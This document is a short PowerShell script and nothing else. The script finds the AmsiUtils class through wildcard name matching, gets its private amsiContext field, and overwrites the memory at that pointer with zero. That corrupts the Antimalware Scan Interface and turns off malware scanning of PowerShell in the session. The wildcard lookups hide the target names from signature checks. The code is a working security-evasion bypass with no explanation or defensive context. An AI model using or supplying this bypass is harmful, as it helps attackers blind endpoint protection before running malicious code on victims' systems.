foreach($i in [Ref].Assembly.GetTypes())
{if($i.Name -like "*iUtils")
  {$t=$i
  }
}
foreach($j in $t.GetFields("NonPublic,Static"))
{if($j.Name -like "*Context")
  {$f=$j
  }
}
[IntPtr]$ctx=$f.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ctx, 1)

